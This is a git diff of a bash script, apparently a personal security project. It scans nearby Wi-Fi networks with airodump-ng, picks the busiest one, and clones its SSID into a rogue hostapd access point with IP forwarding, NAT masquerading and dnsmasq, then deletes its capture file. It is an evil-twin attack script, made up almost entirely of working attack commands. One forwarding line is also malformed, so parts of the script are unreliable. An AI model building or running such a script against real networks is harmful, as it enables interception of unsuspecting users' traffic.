@@ -1,10 +1,12 @@
 #!/bin/bash
-
+# Scan all AP around us
 interface="$1"
 
 clear
 
 sudo airmon-ng check kill
+
+sudo airmon-ng start wlan0 
 
 sudo timeout -s 2 15 airodump-ng wlan0mon -w psk & echo "DEBUG" & sleep 16
 
@@ -36,3 +38,24 @@ done < "$input"
 echo "$maxData"
 echo "$finalName"
 echo "$finalSSID"
+
+# Creation of our AP 
+sudo airmon-ng stop wlan0mon
+
+sed -i "5s/.*/ssid="$finalName"/" hostconf.conf
+
+sudo echo 1 > sudo /proc/sys/net/ipv4/ip_forward
+echo "Echo 1 OK"
+
+sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+echo "iptables OK"
+
+sudo ip addr add 192.168.1.1/24 dev wlan0
+echo "ip add OK"
+
+sudo gnome-terminal -- bash -c "sudo hostapd /home/mike/Documents/Secu/hostconf.conf ; exec bash"
+
+sudo dnsmasq -d -C host.conf
+
+sudo rm psk-01.kismet.csv
+
